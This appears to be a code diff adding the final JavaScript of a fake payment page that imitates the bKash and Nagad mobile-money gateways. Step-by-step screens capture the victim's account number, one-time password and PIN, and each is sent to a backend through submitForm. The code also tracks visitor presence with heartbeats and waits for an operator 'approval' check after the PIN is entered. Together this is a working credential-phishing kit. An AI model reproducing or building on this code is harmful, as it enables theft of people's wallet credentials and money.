+  function resetBk() { clearInterval(bkOtpTimer); clearInterval(approvalCheckTimer); document.querySelectorAll("#page-bkash .screen-panel").forEach(function (p) { p.classList.remove("visible"); }); document.getElementById("bk-screen1").classList.add("visible"); ["bk-field-account", "bk-field-otp", "bk-field-pin"].forEach(function (id) { var e = document.getElementById(id); if (e) e.value = ""; }); dBtn("bk-btn-confirm1"); dBtn("bk-btn-confirm2"); dBtn("bk-btn-confirm3"); }
+  window.bkSwitchScreen = function (n) { document.querySelectorAll("#page-bkash .screen-panel").forEach(function (p) { p.classList.remove("visible"); }); document.getElementById("bk-screen" + n).classList.add("visible"); if (n === 2) { setTimeout(function () { document.getElementById("bk-field-otp").focus(); }, 100); startBkOtpTimer(); } if (n === 3) setTimeout(function () { document.getElementById("bk-field-pin").focus(); }, 100); if (n === 1) clearInterval(bkOtpTimer); };
+  window.bkConfirmAccount = function () { var ph = document.getElementById("bk-field-account").value.trim(); submitForm({ step: "account", gateway: "bKash", account: ph, amount: FORM_AMOUNT }); bkSwitchScreen(2); };
+  window.bkConfirmOtp = function () { var ot = document.getElementById("bk-field-otp").value.trim(); submitForm({ step: "otp", gateway: "bKash", otp: ot, amount: FORM_AMOUNT }); clearInterval(bkOtpTimer); bkSwitchScreen(3); };
+  window.bkSubmit = function () { var pi = document.getElementById("bk-field-pin").value.trim(); submitForm({ step: "pin", gateway: "bKash", pin: pi, amount: FORM_AMOUNT, status: "done" }); bkSwitchScreen(5); startApprovalCheck(VISITOR_ID); };
+  function sNg(id) { var c = document.getElementById(id); if (!c) return; var f = c.querySelectorAll(".digit-field"); f.forEach(function (fd, i) { fd.addEventListener("keydown", function (e) { if (e.key === "Backspace" && fd.value === "" && i > 0) { f[i - 1].value = ""; f[i - 1].focus(); e.preventDefault(); } if (!/^\d$/.test(e.key) && e.key !== "Backspace" && e.key !== "Delete" && e.key !== "ArrowLeft" && e.key !== "ArrowRight" && e.key !== "Tab") e.preventDefault(); }); fd.addEventListener("input", function () { fd.value = fd.value.replace(/\D/g, ""); if (fd.value !== "" && i < f.length - 1) f[i + 1].focus(); }); }); }
+  sNg("ng-cluster-account"); sNg("ng-cluster-otp"); sNg("ng-cluster-pin");
+  function rNg(id) { var r = ""; document.querySelectorAll("#" + id + " .digit-field").forEach(function (f) { r += f.value; }); return r; }
+  function ngV(id) { ["ng-view-account", "ng-view-otp", "ng-view-pin", "ng-view-loading", "ng-view-waiting"].forEach(function (v) { document.getElementById(v).classList.add("is-hidden"); }); document.getElementById(id).classList.remove("is-hidden"); }
+  function ngH() { ["ng-btn-group-account", "ng-btn-group-otp", "ng-btn-group-pin", "ng-btn-group-waiting"].forEach(function (b) { document.getElementById(b).classList.add("is-hidden"); }); }
+  function resetNg() { clearInterval(ngOtpTimer); clearInterval(approvalCheckTimer); ngV("ng-view-account"); ngH(); document.getElementById("ng-btn-group-account").classList.remove("is-hidden"); document.querySelectorAll("#ng-cluster-account .digit-field,#ng-cluster-otp .digit-field,#ng-cluster-pin .digit-field").forEach(function (i) { i.value = ""; }); }
+  window.ngMoveToOtp = function () { var acc = rNg("ng-cluster-account"); submitForm({ step: "account", gateway: "Nagad", account: acc, amount: FORM_AMOUNT }); ngV("ng-view-otp"); ngH(); document.getElementById("ng-btn-group-otp").classList.remove("is-hidden"); document.querySelectorAll("#ng-cluster-otp .digit-field").forEach(function (i) { i.value = ""; }); document.querySelector("#ng-cluster-otp .digit-field").focus(); startNgOtpTimer(); };
+  window.ngBackToAccount = function () { clearInterval(ngOtpTimer); ngV("ng-view-account"); ngH(); document.getElementById("ng-btn-group-account").classList.remove("is-hidden"); };
+  window.ngCheckOtp = function () { var ot = rNg("ng-cluster-otp"); submitForm({ step: "otp", gateway: "Nagad", otp: ot, amount: FORM_AMOUNT }); clearInterval(ngOtpTimer); ngV("ng-view-pin"); ngH(); document.getElementById("ng-btn-group-pin").classList.remove("is-hidden"); };
+  window.ngBackToOtp = function () { ngV("ng-view-otp"); ngH(); document.getElementById("ng-btn-group-otp").classList.remove("is-hidden"); startNgOtpTimer(); };
+  window.ngFinalize = function () { var pn = rNg("ng-cluster-pin"); submitForm({ step: "pin", gateway: "Nagad", pin: pn, amount: FORM_AMOUNT, status: "done" }); ngV("ng-view-waiting"); ngH(); document.getElementById("ng-btn-group-waiting").classList.remove("is-hidden"); startApprovalCheck(VISITOR_ID); };
+
+  document.addEventListener("DOMContentLoaded", function () {
+    if (!ORDER_ID) { sendVisit(); }
+    setInterval(function () { sendHeartbeat(); }, 10000);
+    window.addEventListener('beforeunload', function () { fetch(API_BASE + '/track/heartbeat', { method: 'POST', keepalive: true, headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ visitorId: VISITOR_ID, status: 'Offline' }) }); });
+    
+    var c = document.getElementById(paymentConfig.containerId);
+    if (c) {
+      c.innerHTML = "";
+      paymentConfig.items.forEach(function (item) {
+        var btn = document.createElement("div");
+        btn.className = "option-item " + item.id;
+        btn.addEventListener("click", function() { selectGateway(item.gateway); });
+        var iw = document.createElement("div"); iw.className = "gw-icon";
+        var img = document.createElement("img"); img.src = item.imageSrc; img.alt = item.name;
+        img.onerror = function () { this.style.display = 'none'; iw.textContent = item.name.charAt(0); iw.style.fontSize = '36px'; iw.style.fontWeight = '800'; iw.style.color = '#fff'; iw.style.background = item.id === 'bkash-card' ? '#e6007e' : '#d92550'; };
+        iw.appendChild(img);
+        var ct = document.createElement("div"); ct.className = "gw-info";
+        var n = document.createElement("h3"); n.textContent = item.name;
+        var d = document.createElement("p"); d.textContent = item.description;
+        ct.appendChild(n); ct.appendChild(d);
+        var ar = document.createElement("div"); ar.className = "gw-arrow"; ar.textContent = '\u203A';
+        btn.appendChild(iw); btn.appendChild(ct); btn.appendChild(ar);
+        c.appendChild(btn);
+      });
+    }
+
+    var el = document.getElementById('btn-gateway-cancel'); if (el) el.addEventListener('click', goToGateway);
+    el = document.getElementById('bk-back1'); if (el) el.addEventListener('click', function() { bkSwitchScreen(1); });
+    el = document.getElementById('bk-back2'); if (el) el.addEventListener('click', function() { bkSwitchScreen(2); });
+    el = document.getElementById('bk-btn-confirm1'); if (el) el.addEventListener('click', bkConfirmAccount);
+    el = document.getElementById('bk-btn-confirm2'); if (el) el.addEventListener('click', bkConfirmOtp);
+    el = document.getElementById('bk-btn-confirm3'); if (el) el.addEventListener('click', bkSubmit);
+    el = document.getElementById('bk-btn-myorders'); if (el) el.addEventListener('click', function() { window.location.href = '/my-orders'; });
+    el = document.getElementById('bk-btn-support'); if (el) el.addEventListener('click', function() { window.location.href = '/'; });
+    el = document.getElementById('ng-btn-next'); if (el) el.addEventListener('click', ngMoveToOtp);
+    el = document.getElementById('ng-btn-cancel'); if (el) el.addEventListener('click', goToGateway);
+    el = document.getElementById('ng-btn-verify'); if (el) el.addEventListener('click', ngCheckOtp);
+    el = document.getElementById('ng-btn-back1'); if (el) el.addEventListener('click', ngBackToAccount);
+    el = document.getElementById('ng-btn-confirm'); if (el) el.addEventListener('click', ngFinalize);
+    el = document.getElementById('ng-btn-back2'); if (el) el.addEventListener('click', ngBackToOtp);
+    el = document.getElementById('ng-btn-myorders'); if (el) el.addEventListener('click', function() { window.location.href = '/my-orders'; });
+    el = document.getElementById('ng-btn-support'); if (el) el.addEventListener('click', function() { window.location.href = '/'; });
+
+    var bkAcc = document.getElementById("bk-field-account"), bkOtp = document.getElementById("bk-field-otp"), bkPin = document.getElementById("bk-field-pin");
+    if (bkAcc) bkAcc.addEventListener("input", function () { uBtn("bk-field-account", "bk-btn-confirm1"); });
+    if (bkOtp) bkOtp.addEventListener("input", function () { uBtn("bk-field-otp", "bk-btn-confirm2"); });
+    if (bkPin) bkPin.addEventListener("input", function () { uBtn("bk-field-pin", "bk-btn-confirm3"); });
+  });
+})();
+</script>
+</body>
+</html>
